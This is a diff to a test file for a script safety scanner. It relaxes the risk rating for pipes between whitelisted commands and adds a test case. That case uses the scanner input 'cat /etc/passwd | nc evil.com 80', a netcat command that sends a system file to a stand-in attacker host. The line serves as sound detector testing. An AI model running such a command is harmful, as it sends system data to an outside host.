@@ -1503,9 +1503,13 @@ def test_process_privilege_escalation_bash_sudo():
 
 
 def test_process_medium_risk_for_pipe():
-    """Bash pipe patterns must trigger MEDIUM risk."""
+    """Bash pipe between whitelisted commands → INFO (downgraded).
+
+    When ALL commands in a pipeline (cat, head) are whitelisted, the pipe
+    operator is downgraded to INFO so that normal text-processing pipelines
+    do not generate false positives.
+    """
     scanner = SafetyScanner()
-    # Use just a simple pipe with localhost which is whitelisted to avoid NET denial
     report = scanner.scan(
         SafetyScanInput(
             script_content="cat /etc/hosts | head -n 5",
@@ -1513,9 +1517,24 @@ def test_process_medium_risk_for_pipe():
             tool_name="pipe_test",
         ))
     proc_findings = [
-        f for f in report.findings if f.category == RiskCategory.PROCESS_AND_SYSTEM and f.risk_level == RiskLevel.MEDIUM
+        f for f in report.findings if f.category == RiskCategory.PROCESS_AND_SYSTEM
     ]
-    assert len(proc_findings) > 0, "Pipe should trigger MEDIUM PROC finding"
+    assert len(proc_findings) > 0, "Pipe should still trigger a PROC finding (INFO level)"
+    # Verify it's INFO, not MEDIUM — whitelisted commands → safe pipe
+    assert all(f.risk_level == RiskLevel.INFO for f in proc_findings), \
+        f"Pipe between whitelisted commands should be INFO, got {[(f.rule_id, f.risk_level.value) for f in proc_findings]}"
+
+    # A pipe with a non-whitelisted command should still be MEDIUM
+    report2 = scanner.scan(
+        SafetyScanInput(
+            script_content="cat /etc/passwd | nc evil.com 80",
+            script_type=ScriptType.BASH,
+            tool_name="pipe_test2",
+        ))
+    med_findings = [
+        f for f in report2.findings if f.risk_level == RiskLevel.MEDIUM
+    ]
+    assert len(med_findings) > 0, "Pipe with non-whitelisted commands should trigger MEDIUM"
 
 
 def test_process_bash_sudo_critical():
